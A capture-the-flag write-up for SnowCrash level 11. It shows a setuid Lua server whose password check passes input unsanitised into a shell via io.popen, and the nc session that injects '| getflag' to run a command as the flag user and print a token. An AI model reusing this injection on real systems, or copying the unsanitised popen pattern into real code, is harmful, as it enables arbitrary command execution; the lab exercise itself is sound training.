Level 11
========

*	We spawn with one file
	```console
	level11@SnowCrash:~$ ls -l
	total 4-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
	level11@SnowCrash:~$ ./level11.lua
	lua: ./level11.lua:3: address already in usestack traceback:[C]: in function 'assert'./level11.lua:3: in main chunk[C]: ?
	```
*	It is a lua script that creates a socket server which will listen on `localhost:5151`
*	It waits for incoming connections from client and except to recieve a password
*	Then it hashes the password using `SHA1` and check if it matches
	```lua
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	```
*	BUT WAIT ! It is a trap, in fact we don't need to decrypt the hash
*	When we look at the line about the sha1 encryption we can see that the echo command is user here, we can then use the most used vulnerability in this project
	```console
	level11@SnowCrash:~$ nc 127.0.0.1 5151
	Password:  | getflag > /tmp/stuff
	Erf nope..
	level11@SnowCrash:~$ cat /tmp/stuffCheck 
	flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
	```